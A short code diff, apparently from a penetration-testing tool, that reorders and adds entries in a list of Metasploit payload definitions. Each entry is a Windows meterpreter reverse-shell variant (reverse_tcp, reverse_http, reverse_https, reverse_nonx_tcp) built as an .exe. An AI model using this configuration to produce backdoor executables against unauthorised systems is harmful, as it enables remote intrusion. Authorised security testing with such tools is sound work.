@@ -136,12 +136,6 @@ payloads = [
             },
             {
                 "title": "",
-                "payload": "windows/meterpreter/reverse_nonx_tcp",
-                "format": "exe",
-                "filename": args.msf_file_basename + ".exe"
-            },
-            {
-                "title": "",
                 "payload": "windows/meterpreter/reverse_http",
                 "format": "exe",
                 "filename": args.msf_file_basename + ".exe"
@@ -149,6 +143,18 @@ payloads = [
             {
                 "title": "",
                 "payload": "windows/meterpreter/reverse_https",
+                "format": "exe",
+                "filename": args.msf_file_basename + ".exe"
+            },
+            {
+                "title": "",
+                "payload": "windows/meterpreter/reverse_nonx_tcp",
+                "format": "exe",
+                "filename": args.msf_file_basename + ".exe"
+            },
+            {
+                "title": "",
+                "payload": "windows/meterpreter/reverse_tcp",
                 "format": "exe",
                 "filename": args.msf_file_basename + ".exe"
             },
